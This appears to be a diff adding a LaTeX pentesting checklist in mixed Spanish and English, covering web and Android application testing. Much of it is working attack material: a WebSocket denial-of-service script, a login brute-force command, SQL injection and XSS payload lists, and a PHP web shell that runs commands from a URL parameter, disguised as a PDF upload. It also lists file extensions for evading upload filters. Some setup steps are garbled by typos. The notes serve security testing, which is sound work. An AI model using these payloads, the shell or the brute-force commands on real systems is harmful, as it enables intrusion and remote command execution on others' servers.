@@ -1,0 +1,386 @@
+
+%----------------------------------------------------------------------------------------
+%	SECTIONS
+%----------------------------------------------------------------------------------------
+
+\section{Herramientas}
+
+\begin{itemize}
+\item ADB (Android Debug Bridge)
+\item Apktool
+ \item Drozer
+ \item dex2jar
+ \item jd-gui
+ \item Mobile Security Framework (MobSF)
+ \item Yaazhini
+ \item Sixo Online APK Analyzer | sisik
+ \item Checkout - VAPT (getastra.com)
+ \item Nox Player
+\end{itemize}
+
+Nox player requiere desactivatr Hyper V. 
+
+\begin{enumerate}
+	\item Instala Root Checker
+ \item General settings > Root
+ \item Ir a desplazar configuarion > manter wifi> modify settings > proxy
+ \item poner burpsuite como all intercaes su ip y puerto local
+ \item Instala el certicicado CA http://burpsuite, renombra. der a .cer > instalra ombra rl cerfiica Burp que se par VPN y Apps el certifdicado
+ \item Instal el cerifciao con figurtaicon wifi > advanced > install certiciate
+\end{enumerate}
+
+
+\section{WebSocket Unencrypted Communications Verification}
+
+Search for headers: Sec-WebSocket-
+
+\section{WebSocket Cross-site hijacking Test}
+
+\nonumsidenote{Usually a web aplication could work with HTTP 1.0, HTTP 2.0, WebSockets and WebHooks.}
+Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.
+
+In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.
+For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie
+
+
+\begin{lstlisting}[numbers=none]
+	GET /chat HTTP/1.1
+	Host: normal-website.com
+	Sec-WebSocket-Version: 13
+	Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+	Connection: keep-alive, Upgrade
+	Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+	Upgrade: websocket
+\end{lstlisting}
+
+\begin{fullwidth} % Use the whole page width
+The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
+If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:
+\end{fullwidth}
+
+\section{WebSocket Denial of Service Test}
+
+\begin{lstlisting}[numbers=none]
+	const WebSocket = require('ws');
+	const net = require('net');
+	const wss = new WebSocket.Server({ port: 3000 }, function () {
+	  const payload = 'constructor';  // or ',;constructor'
+	const request = [
+		'GET / HTTP/1.1',
+		'Connection: Upgrade',
+		'Sec-WebSocket-Key: test',
+		'Sec-WebSocket-Version: 8',
+		`Sec-WebSocket-Extensions: ${payload}`,
+		'Upgrade: websocket',
+		'\r\n'
+	  ].join('\r\n');
+	const socket = net.connect(3000, function () {
+		socket.resume();
+		socket.write(request);
+	  });
+	});  
+\end{lstlisting}
+
+\section{TLS/SSL Verfication}
+
+TLSLED
+\begin{lstlisting}[numbers=none]
+sudo apt install tlssled
+tlssled vulnerable-site.com 443
+\end{lstlisting}
+
+SSLSCAN
+\begin{lstlisting}[numbers=none]
+sudo apt install sslscan
+sslscan https://vulnerable-site.com 
+\end{lstlisting}
+
+\section{HTTP Security Headers Verification}
+
+SHCHEK
+\begin{lstlisting}[numbers=none]
+pip3 install shcheck
+shcheck.py https://insecurity.blog
+\end{lstlisting}
+
+\section{HTTP Host Header Injection}
+
+CURL
+\begin{lstlisting}[numbers=none]
+curl -s -D - --header 'Host: the-evil-site.com' https://vulnerable-site.com /index.php/rmpe > output && cat output | grep --color -E '^|the-evil-site.com' 
+\end{lstlisting}
+
+
+\section{HTTP Options Method Verification}
+
+Add nmap to Kali Linux Subsystem
+\begin{lstlisting}[numbers=none]
+alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
+\end{lstlisting}
+
+NMAP
+\begin{lstlisting}[numbers=none]
+nmap --script http-methods <target>
+\end{lstlisting}
+
+In specific path
+\begin{lstlisting}[numbers=none]
+curl -i -X OPTIONS http://example.org/path
+\end{lstlisting}
+
+\section{HTTP Trace Method Check}
+
+\begin{lstlisting}[numbers=none]
+curl --insecure -v -X TRACE https://www.google.com/
+\end{lstlisting}
+
+La respuesta esperada para que no este activo es: 405 Method Not Allowed
+
+\section{HTTP Cookies Verification}
+
+CURL
+\begin{lstlisting}[numbers=none]
+curl 'https://vulnerable-site.com' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
+\end{lstlisting}
+
+\section{Subresource Integrity (SRI)  Implementation Verification}
+
+CURL
+\begin{lstlisting}[numbers=none]
+sudo apt install tidy
+curl -s https://laysent.github.io/subresource-integrity-demo/integrity.html | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
+\end{lstlisting}
+
+
+\section{Login brute force attack test}
+
+GitHub - FlorianBord2/Hatch-python3-optimised: Hatch is a brute force tool that is used to brute force most websites
+
+
+\begin{lstlisting}[numbers=none]
+	git clone https://github.com/FlorianBord2/Hatch-python3-optimised
+\end{lstlisting}
+
+
+\begin{lstlisting}[numbers=none]
+	python main.py --website "https://vulnerable-site.com /login" --passlist  passlist.txt  --username "cibersoc_3tin"  --usernamesel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(1) > div > div > input" --passsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(2) > div > div > input" --loginsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(2) > div > div > div > button > span"
+\end{lstlisting}
+
+
+\section{Web application exploration}
+
+Navigation.
+
+Identify user flows.
+
+\section{Ports identification}
+
+Use NMAP.
+
+
+\section{Hosted and related applications identification}
+
+Virtual hosts maybe.
+
+\begin{lstlisting}[numbers=none]
+nmap -sV --script=http-enum <target>
+\end{lstlisting}
+
+\section{User roles identification}
+
+Identify user roles in application names, ids.
+
+\section{Files and folders discover}
+
+\begin{lstlisting}[numbers=none]
+sudo apt install dirb
+dirb https://vulnerable-site.com /ingresar
+\end{lstlisting}
+
+\section{Web application technologies recognition}
+
+Use Walapalizer chrome extension.
+
+\href{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}{Enlace de la extensión}
+
+
+\section{Search for known vulnerabilities of recognized technologies}
+
+https://security.snyk.io/
+
+
+
+\section{Extraction of metadata from downloadable files}
+
+\begin{lstlisting}[numbers=none]
+exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'>
+\end{lstlisting}
+
+\section{Extraction of embedded files}
+
+\begin{lstlisting}[numbers=none]
+pip install docscraper 
+sudo apt install exiftool
+
+
+import docscraper 
+allowed_domains = ["vulnerable-site.com "]
+start_urls = ["https://vulnerable-site.com /index.php/rmpe"]
+extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
+docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
+\end{lstlisting}
+
+\begin{lstlisting}[numbers=none]
+wget https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py
+python3 link_extractor.py https://github.com -m 2
+curl https://vulnerable-site.com /index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\n' | grep -Eo '(http|https|www):(.*)'
+\end{lstlisting}
+
+Descargar con el nombre propuesto por el servidor en lugar de wget:
+\begin{lstlisting}[numbers=none]
+curl -JLO https:\/\/vulnerable-site.com \/index.php\/rmpe\/article\/download\/62\/58\/100
+\end{lstlisting}
+
+Search for usernames:
+\begin{lstlisting}[numbers=none]
+exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'
+\end{lstlisting}
+
+
+\section{Data extraction from Javascript Source Code}
+
+Installation of tools:
+\begin{lstlisting}[numbers=none]
+pip install jsbeautifier
+js-beautify file.js
+\end{lstlisting}
+	
+Encription keys search:
+\begin{lstlisting}[numbers=none]
+curl -s https://vulnerable-site.com/js/app.dca99adc.js | js-beautify | awk '{$1=$1;print}' | grep -iE  "crypt|aes|hmac|md5|sha512|sha256|sha1"
+
+echo -n 'hsBI69O90juKhpPx' | md5sum 
+\end{lstlisting}
+
+In case the code is obsfuscated:
+\begin{itemize}
+	\item JavaScript Deobfuscator (deobfuscate.io)
+	\item de4js | JavaScript Deobfuscator and Unpacker (lelinhtinh.github.io)
+\end{itemize}
+
+Encrypt and Decrypt with Key in Online | Online Encryption and Decryption (bitcompiler.com)
+JSON Web Tokens - jwt.io
+
+Si esta en cifrado en la URL entonces URL Parameters o algo asi usar primero un URL Decoder URI.
+
+\section{Code injection validation}
+
+\begin{lstlisting}[numbers=none]
+' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
+\end{lstlisting}
+
+Other payloads:
+\begin{lstlisting}[numbers=none]
+<a href='www.evil-site.com'>www.evil-site.com link</a>
+<a href="javascript:document.write('<image src =q onerror=prompt(8)>')">evil link</a>
+<a href="javascript:let pdfWindow = window.open('');pdfWindow.document.write( `<iframe width='100%' height='100%' src='data:text/html;base64, ` + encodeURI(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`) + `'></iframe>` )
+">evil link</a>
+<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4='>clic on xss</a>
+<script>javascript:alert(123456789)</script>
+<image src =q onerror=prompt(8)>
+<img src="javascript:alert('XSS');">
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe><textarea></iframe><img src='' onerror='alert(document.domain)'>
+</textarea><script>alert(/xss/)</script>
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);" onerror="javascript:alert(1)"  onclick="javascript:alert(1)">
+<iframe><textarea></iframe><img src="" onerror="alert('14/04/2022')">
+
+<image src =q onerror=`window.parent.location = 'http://127.0.0.1:8000/SPC.html'`>
+<image src =q onerror='javascript:alert(1223456789)'>
+\end{lstlisting}
+
+Example: Base64 XSS payload
+\begin{lstlisting}[numbers=none]
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+\end{lstlisting}
+
+Insert value in HTML element with javascript:
+\begin{lstlisting}[numbers=none]
+	document.getElementById("f_464cf370-896e-4af1-a0b1-3f4621ff0a36").value = '<script>javascript:alert(123456789)</script>';
+\end{lstlisting}
+	
+
+\section{Cross Site Scripting Validation}
+
+\begin{lstlisting}[numbers=none]
+<script>javascript:alert(1)</script>
+\end{lstlisting}
+
+\section{File upload feature check: Webshell upload test}
+
+\begin{lstlisting}[numbers=none]
+https://github.com/TheBinitGhimire/Web-Shells
+\end{lstlisting}
+
+\begin{lstlisting}[numbers=none]
+Content-Disposition: form-data; name="file"; filename="documento.php"
+Content-Type: application/pdf
+
+text/x-php
+
+\%PDF-1.7
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<p>This is an example of webshell to execute commands in remote server:</p>
+<pre>
+<?php
+   if(isset($_GET['cmd']))
+   {
+       system($_GET['cmd']);
+   }
+?>
+<script>javacript:alert('XSS PAYLOAD')</script>
+</pre>
+</body>
+</html>
+\%\%EOF
+
+\end{lstlisting}
+
+
+Change de MimeType to render.
+
+\begin{lstlisting}[numbers=none]
+
+Content-Type: application/x-php
+
+text/x-php
+text/html
+text/plain
+text/x-php
+application/x-php
+application/x-httpd-php
+application/x-httpd-php-source
+
+\end{lstlisting}
+
+
+Other useful extensions:
+
+\begin{enumerate}
+    \item PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+    \item ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+    \item JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm
+    \item Flash: .swf
+    \item Perl: .pl, .cgi
+\end{enumerate}
+ 
